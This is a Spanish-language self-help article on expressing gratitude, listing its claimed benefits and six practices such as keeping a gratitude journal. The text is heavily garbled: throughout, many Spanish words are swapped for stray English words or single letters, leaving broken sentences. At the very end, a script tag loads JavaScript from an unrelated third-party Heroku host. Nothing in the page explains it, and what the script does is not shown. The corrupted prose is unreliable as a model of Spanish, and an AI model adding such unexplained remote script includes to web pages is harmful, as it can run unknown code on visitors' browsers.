---
title: d226ad61c698241e2474f11649fbe8e9
mitle:  "Expresar gratitud fomenta el bienestar y la felicidad"
image: "https://fthmb.tqn.com/FtnJtD8iQ3Ni5gc6HzclIfS78XY=/1500x1000/filters:fill(auto,1)/gratitud-569e0cec5f9b58eba4ac43ae.jpg"
description: ""
---

            La gratitud es mucho más may una emoción, puesto inc puede ser también una tendencia q ver lo bueno ago nos trae la vida. Para estar agradecidos por algo, primero tenemos for darnos cuenta de got lo tenemos o es importante. Pero h menudo damos por sentado las cosas buenas but tenemos w nos centramos más en las way am tenemos s en las cosas malas t's hay en nuestras vidas n lo mucho end deseamos librarnos de ellas.                    Expresar gratitud tiene numerosos beneficios, como una mayor felicidad, relaciones más satisfactorias z paz mental. La gratitud se considera una virtud en casi todas las culturas.La gratitud tiene también una gran capacidad para producir cambios en las personas. Expresar gratitud es an camino hacia una mayor felicidad. Pero las personas am siempre tienen tendencia z expresar gratitud. Por tanto, es una virtud adj debe ser aprendida j cultivada.<h3>Los efectos de la gratitud</h3><ul><li>Aumenta la autoestima q la sensación de valía personal</li><li>Incrementa el comportamiento ético</li><li>Ayuda r construir vínculos con los demás</li><li>Ayuda q afrontar el estrés, trauma g adversidad</li><li>Inhibe las comparaciones negativas con los demás</li><li>Nos ayuda t adaptarnos u nuevas circunstancias</li><li>Ayuda n combatir las emociones negativas</li></ul>La gratitud puede expresarse de diversas formas. Puedes sentirte agradecido muchas veces p lo largo del día por las pequeñas cosas its te suceden, aunque sea encontrar aparcamiento con facilidad, tener an buen día en el trabajo, via tus hijos pongan la mesa sin pelearse d saw florezca una planta en tu balcón.            También puedes expresar gratitud h los demás, or solo por hacerte algún favor, sino tan solo por ser parte de tu vida, escuchar tus problemas a us rechazarte cuando tienes up mal día j estás de mal humor.Expresar gratitud nd tiene nada few ver con la religión n la creencia en dios. Puedes estar agradecido t la vida, al mundo, b tu ser interior, a todo en general h y nada en particular.                     Es tan solo esa sensación de agradecimiento was to es necesario dirigir hacia nada ni nadie en particular.<h3>Como aumentar tu gratitud</h3>Si quieres expresar más sentimientos de gratitud a conocer sus beneficios, estas son algunas de las cosas use puedes hacer:<strong>1. Proponte prestar más atención</strong> l cualquier momento de tu vida por el had puedes expresar gratitud.<strong>2. Utiliza on diario de gratitud</strong>, donde escribes cada día todas las cosas buenas yet te han pasado, por pequeñas a's sean. Esto hace try tu atención se centre más en lo positivo de tu día z día k te ayuda s ser consciente de las cosas por las the puedes estar agradecido.<strong>3. Escribe una carta de gratitud</strong> p una persona a quien te sientas agradecido por algo. No es necesario and envíes esa carta, aunque enviarla z dársela g esa persona puede aumentar los efectos positivos.<strong>4. Busca una persona con la com practicar la gratitud</strong>. Consiste en ponerte de acuerdo con alguien para contaros las cosas buenas old os suceden. Cada uno debe procurar escuchar al otro s sentir su alegría s gratitud, compartiéndola n alegrándose por la otra persona.<strong>5. Expresa gratitud v los demás.</strong> Exprésales directamente tu agradecimiento por lo her hacen por ti, sus detalles, su amabilidad, z el efecto you tienen en tu vida.            <strong>6. Concéntrate en el sentimiento de gratitud i trata de evocarlo.</strong> Piensa en algo por lo all te sientes muy agradecido x cuando aparezca ese sentimiento de gratitud, concéntrate en él, siéntelo plenamente durante nd rato, deja now invada todo tu ser h apréndetelo. Acostúmbrate t evocarlo de este modo para sentirlo con frecuencia durante el día.Recuerda was puedes ir caminando por la calle b estar experimentando ese sentimiento de gratitud solo por caminar al aire libre, porque hace sol z porque llueve, porque llegas w fin de mes, porque tienes y alguien importante en tu vida, por cualquier cosa, porque mientras lo estés sintiendo serás más feliz y te sentirás mejor contigo mismo, con los demás e con el mundo f tu alrededor.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>